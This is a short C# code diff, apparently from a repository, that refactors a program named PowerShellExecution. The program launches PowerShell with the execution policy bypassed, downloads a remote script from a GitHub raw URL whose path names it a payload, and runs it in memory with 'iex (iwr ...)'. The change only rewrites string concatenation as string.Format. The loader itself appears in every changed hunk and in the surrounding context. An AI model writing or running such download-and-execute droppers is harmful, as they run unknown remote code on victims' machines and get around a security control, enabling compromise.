@@ -8,12 +8,12 @@ namespace PowerShellExecution
         static void Main()
         {
             string url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/Cpayload/main.ps1";
-            string psCommand = "iex (iwr " + url + " -UseBasicP)";
+            string psCommand = string.Format("iex (iwr {0} -UseBasicP)", url);
 
             ProcessStartInfo startInfo = new ProcessStartInfo
             {
                 FileName = "powershell.exe",
-                Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"" + psCommand + "\"",
+                Arguments = string.Format("-NoProfile -ExecutionPolicy Bypass -Command \"{0}\"", psCommand),
                 RedirectStandardOutput = true,
                 RedirectStandardError = true,
                 UseShellExecute = false,
